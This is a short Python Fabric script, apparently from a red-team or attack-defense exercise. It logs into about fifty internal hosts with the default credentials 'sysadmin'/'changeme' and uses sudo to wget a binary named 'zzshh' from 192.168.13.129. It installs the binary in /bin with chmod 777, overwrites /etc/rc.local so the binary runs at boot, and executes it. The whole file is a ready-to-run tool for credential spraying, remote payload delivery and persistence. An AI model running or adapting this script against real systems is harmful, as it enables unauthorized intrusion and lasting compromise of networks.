from fabric import Connection, SerialGroup as Group, Config
import getpass
hosts = []
for i in range (1,14):
	single=f"sysadmin@10.{i}."
	hosts.extend([single+"1.10", single+"1.20", single+"2.2", single+"2.3"])

for hostelele in hosts:
	try:
		config = Config(overrides={'sudo':{'password':'changeme'}})
		c = Connection(hostelele, connect_kwargs={"password":"changeme"}, config=config)
		c.sudo("sh -c 'wget 192.168.13.129/temp/zzshh && mv zzshh /bin/ && chmod 777 /bin/zzshh && printf \"#!/bin/bash\n/bin/./zzshh\nexit 0\" > /etc/rc.local && /bin/./zzshh'")
	except:
		continue
